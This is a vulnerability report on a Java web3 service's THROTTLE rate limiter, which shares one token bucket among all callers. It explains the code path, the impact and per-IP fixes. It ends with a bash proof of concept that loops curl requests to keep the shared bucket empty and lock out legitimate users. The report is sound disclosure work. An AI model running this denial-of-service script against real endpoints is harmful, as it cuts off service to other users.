### Title
Shared Per-Filter THROTTLE Bucket Enables Unprivileged DoS Against Matching Request Patterns

### Summary
The `THROTTLE`-action `RequestProperties` filter in `ThrottleManagerImpl` uses a single process-wide `Bucket` instance (lazily created once per `RequestProperties` object) that is shared across all callers with no per-IP or per-user isolation. An unprivileged attacker who can send HTTP requests to the web3 endpoint can exhaust this shared bucket by sending requests that match the filter's pattern, causing every subsequent matching request from any legitimate user to receive a `ThrottleException` until the bucket refills. Because the per-filter bucket capacity is capped at `rate` (max 100 tokens) while the global rate limit defaults to 500 req/sec, the attacker can sustain the exhaustion while staying well under the global guard.

### Finding Description
**Exact code path:**

`ThrottleManagerImpl.throttle()` (lines 44–48) iterates over every configured `RequestProperties` filter and calls `action(requestFilter, request)` for each one whose `test()` returns `true`.

```java
for (var requestFilter : throttleProperties.getRequest()) {
    if (requestFilter.test(request)) {
        action(requestFilter, request);   // line 46
    }
}
```

`action()` (lines 66–76) for the `THROTTLE` case calls `filter.getBucket().tryConsume(1)`:

```java
case THROTTLE -> {
    if (!filter.getBucket().tryConsume(1)) {          // line 71
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
}
```

`RequestProperties.getBucket()` is a `@Getter(lazy = true)` field (line 41–42) backed by `createBucket()` (lines 63–69):

```java
private Bucket createBucket() {
    final var bandwidth = Bandwidth.builder()
            .capacity(rate)                           // max 100 tokens
            .refillGreedy(rate, Duration.ofSeconds(1))
            .build();
    return Bucket.builder().addLimit(bandwidth).build();
}
```

This `Bucket` is created **once** for the `RequestProperties` singleton and is **never partitioned by caller identity**. Every request that matches the filter draws from the same pool.

**Root cause / failed assumption:** The design assumes that the per-filter bucket is a fair shared resource. It fails to account for the fact that a single hostile caller can consume all tokens, starving every other caller that matches the same filter. There is no per-IP, per-session, or per-user sub-bucket.

**Why the existing global guards are insufficient:**

- `rateLimitBucket` defaults to 500 req/sec (`ThrottleProperties.requestsPerSecond = 500`, line 35).
- The per-filter bucket capacity is `rate` ∈ [0, 100] (line 39 of `RequestProperties`).
- An attacker needs only `rate` (≤ 100) requests to exhaust the per-filter bucket, and only `rate` req/sec to keep it exhausted — both well below the 500 req/sec global ceiling.
- The `gasLimitBucket` guard is also bypassed cheaply: `ThrottleProperties.scaleGas()` returns 0 for gas ≤ 10 000 (line 43–46 of `ThrottleProperties`), so requests with `gas=0` consume zero gas tokens.

**`test()` determinism for THROTTLE:** `RequestProperties.test()` line 50 explicitly skips the probabilistic rate-sampling for `THROTTLE` actions:

```java
if (action != ActionType.THROTTLE && RandomUtils.secure().randomLong(0L, 100L) >= rate) {
    return false;
}
```

This means every matching request is guaranteed to hit `action()` and attempt to consume a token, making the exhaustion fully deterministic and reliable.

### Impact Explanation
Any operator-configured `THROTTLE` filter (e.g., "throttle all calls to contract address X" or "throttle calls containing calldata prefix Y") becomes a denial-of-service target. An attacker who knows or can infer the filter pattern can prevent all legitimate users whose requests match that pattern from having their calls processed. Because `ThrottleException` is thrown before any transaction is forwarded, affected users cannot gossip or simulate the targeted transactions for the duration of the attack. Severity is **High** for availability of the targeted request class.

### Likelihood Explanation
The attack requires no credentials, no special network position, and no on-chain assets. The attacker needs only:
1. Knowledge of a deployed THROTTLE filter pattern (discoverable by probing or reading operator documentation/config).
2. The ability to send ≤ 100 HTTP POST requests per second to the public web3 endpoint.

Both conditions are trivially met by any external party. The attack is repeatable indefinitely and self-sustaining at low cost.

### Recommendation
Replace the single global per-filter `Bucket` with per-caller rate limiting. Practical options:

1. **Per-IP bucket map:** Maintain a `ConcurrentHashMap<String, Bucket>` keyed on the caller's IP address (extracted from `HttpServletRequest`) inside `RequestProperties` or a dedicated service. Each IP gets its own bucket with capacity `rate`.
2. **Bucket4j `ProxyManager` with a distributed or local cache backend:** Use `bucket4j`'s built-in `ProxyManager` API to key buckets on caller identity, which also supports distributed deployments.
3. **Move THROTTLE enforcement to a servlet/web filter layer** where per-IP state is naturally available (e.g., Spring's `HandlerInterceptor` with a Caffeine-backed rate-limiter per remote address).

Additionally, consider lowering the global `requestsPerSecond` default or adding a per-IP global guard so that exhausting any shared bucket requires a volume that is itself rate-limited per source.

### Proof of Concept
Preconditions:
- A `THROTTLE`-action `RequestProperties` filter is configured, e.g., matching `TO EQUALS 0x000…0001` with `rate=10`.
- The web3 endpoint is reachable at `http://target/api/v1/contracts/call`.

Steps:

```bash
# Step 1 – Attacker exhausts the per-filter bucket (10 tokens) in one burst
for i in $(seq 1 10); do
  curl -s -X POST http://target/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":0,"data":"0x"}' &
done
wait

# Step 2 – Attacker sustains exhaustion at 10 req/sec (bucket refills at 10/sec)
while true; do
  curl -s -X POST http://target/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":0,"data":"0x"}'
  sleep 0.1
done &

# Step 3 – Legitimate user's matching request is now permanently throttled
curl -X POST http://target/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":0,"data":"0x"}'
# Expected response: HTTP 429 / ThrottleException "Requests per second rate limit exceeded"
```

The legitimate user's request is rejected for as long as the attacker sustains the 10 req/sec stream, with no way for the legitimate user to bypass the shared bucket.
